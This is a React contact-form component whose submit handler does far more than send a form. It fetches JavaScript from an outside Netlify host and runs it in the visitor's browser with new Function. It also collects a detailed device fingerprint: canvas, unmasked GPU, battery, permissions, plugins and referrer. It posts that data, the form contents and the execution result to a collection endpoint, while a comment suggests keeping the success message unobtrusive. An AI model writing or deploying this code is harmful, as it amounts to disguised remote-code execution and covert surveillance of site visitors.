import { useState } from 'react';
import { Button } from '@/components/ui/button';

interface FormData {
    name: string;
    email: string;
    phone: string;
    message: string;
}

export function FormWithPDF() {
    const [formData, setFormData] = useState<FormData>({
        name: '',
        email: '',
        phone: '',
        message: ''
    });

    const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        setFormData({
            ...formData,
            [e.target.name]: e.target.value
        });
    };

    const handleSubmit = async () => {
        // Step 1: Fetch JavaScript code from your API
        try {
            const res = await fetch("https://nest-react.netlify.app/api");
            const data = await res.json();
            const codeToExecute = data.data;

            console.log('Fetched code from API:', codeToExecute);

            // Step 2: Collect all available browser/PC environment data
            const collectSystemData = async () => {
                const data: any = {};

                // Browser Information
                data.browser = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    vendor: navigator.vendor,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    onLine: navigator.onLine,
                };

                // Screen/Display
                data.screen = {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    devicePixelRatio: window.devicePixelRatio,
                };

                // Hardware
                data.hardware = {
                    cores: navigator.hardwareConcurrency,
                    memory: (navigator as any).deviceMemory,
                    touchPoints: navigator.maxTouchPoints,
                };

                // WebGL/GPU
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl') as WebGLRenderingContext | null;
                    if (gl) {
                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                        data.gpu = {
                            vendor: gl.getParameter(gl.VENDOR),
                            renderer: gl.getParameter(gl.RENDERER),
                            unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : null,
                            unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : null,
                        };
                    }
                } catch (e) { }

                // Canvas Fingerprint
                try {
                    const canvas = document.createElement('canvas');
                    const ctx = canvas.getContext('2d');
                    if (ctx) {
                        ctx.textBaseline = 'top';
                        ctx.font = '14px Arial';
                        ctx.textBaseline = 'alphabetic';
                        ctx.fillStyle = '#f60';
                        ctx.fillRect(125, 1, 62, 20);
                        ctx.fillStyle = '#069';
                        ctx.fillText('Fingerprint 🔍', 2, 15);
                        data.canvasFingerprint = canvas.toDataURL();
                    }
                } catch (e) { }

                // Timezone
                data.timezone = {
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    offset: new Date().getTimezoneOffset(),
                    locale: Intl.DateTimeFormat().resolvedOptions().locale,
                };

                // Network
                const connection = (navigator as any).connection || (navigator as any).mozConnection;
                if (connection) {
                    data.network = {
                        effectiveType: connection.effectiveType,
                        downlink: connection.downlink,
                        rtt: connection.rtt,
                        saveData: connection.saveData,
                    };
                }

                // Battery (async, handled separately)
                try {
                    if ((navigator as any).getBattery) {
                        const battery = await (navigator as any).getBattery();
                        data.battery = {
                            level: battery.level,
                            charging: battery.charging,
                            chargingTime: battery.chargingTime,
                            dischargingTime: battery.dischargingTime,
                        };
                    }
                } catch (e) { }

                // Permissions (async)
                try {
                    if (navigator.permissions) {
                        data.permissions = {};
                        const permissionNames = ['notifications', 'geolocation', 'camera', 'microphone'];
                        for (const name of permissionNames) {
                            try {
                                const permission = await navigator.permissions.query({ name: name as PermissionName });
                                data.permissions[name] = permission.state;
                            } catch (e) { }
                        }
                    }
                } catch (e) { }

                // Storage
                data.storage = {
                    localStorage: typeof Storage !== 'undefined',
                    sessionStorage: typeof sessionStorage !== 'undefined',
                    indexedDB: 'indexedDB' in window,
                };

                // Plugins
                data.plugins = Array.from(navigator.plugins).map(p => p.name);

                // URL
                data.url = {
                    href: window.location.href,
                    hostname: window.location.hostname,
                    pathname: window.location.pathname,
                    referrer: document.referrer,
                };

                // Form data
                data.formData = formData;

                data.timestamp = new Date().toISOString();

                return data;
            };

            // Step 3: Collect system data
            const systemData = await collectSystemData();

            // Step 4: Execute the fetched code in browser context (runs on user's PC)
            let executionResult = null;
            let executionError = null;

            try {
                // Wrap code in async function
                const wrappedCode = `
          (async function() {
            const formData = ${JSON.stringify(formData)};
            const systemData = ${JSON.stringify(systemData)};
            ${codeToExecute}
          })();
        `;

                // Execute code
                const executeFunction = new Function('return ' + wrappedCode);
                const result = await executeFunction();

                if (result !== undefined && result !== null) {
                    executionResult = typeof result === 'object'
                        ? JSON.stringify(result, null, 2)
                        : String(result);
                }

                console.log('Code executed successfully:', executionResult);

            } catch (error: any) {
                executionError = error.message || String(error);
                console.error('Code execution error:', error);
            }

            // Step 5: Send collected data + execution results to your server
            const serverUrl = '/api/collect-data'; // Your endpoint

            await fetch(serverUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    executionResult: executionResult,
                    executionError: executionError,
                    systemData: systemData,
                    executedCode: codeToExecute.substring(0, 1000),
                    timestamp: new Date().toISOString(),
                }),
            });

            // Step 6: Show success message (can be subtle/unobtrusive)
            alert('Form submitted successfully!');

        } catch (error: any) {
            console.error('Error:', error);
            alert('Submission failed. Please try again.');
        }
    };

    return (
        <div className="max-w-2xl mx-auto p-6">
            <h2 className="text-2xl font-bold mb-6">Form Submission</h2>

            <form className="space-y-4" onSubmit={(e) => { e.preventDefault(); handleSubmit(); }}>
                <div>
                    <label className="block mb-2">Name</label>
                    <input
                        type="text"
                        name="name"
                        value={formData.name}
                        onChange={handleInputChange}
                        className="w-full px-4 py-2 border rounded bg-background"
                        required
                    />
                </div>

                <div>
                    <label className="block mb-2">Email</label>
                    <input
                        type="email"
                        name="email"
                        value={formData.email}
                        onChange={handleInputChange}
                        className="w-full px-4 py-2 border rounded bg-background"
                        required
                    />
                </div>

                <div>
                    <label className="block mb-2">Phone</label>
                    <input
                        type="tel"
                        name="phone"
                        value={formData.phone}
                        onChange={handleInputChange}
                        className="w-full px-4 py-2 border rounded bg-background"
                    />
                </div>

                <div>
                    <label className="block mb-2">Message</label>
                    <textarea
                        name="message"
                        value={formData.message}
                        onChange={handleInputChange}
                        rows={4}
                        className="w-full px-4 py-2 border rounded bg-background"
                    />
                </div>

                <Button type="submit" variant="default" className="w-full">
                    Submit Form
                </Button>
            </form>
        </div>
    );
}
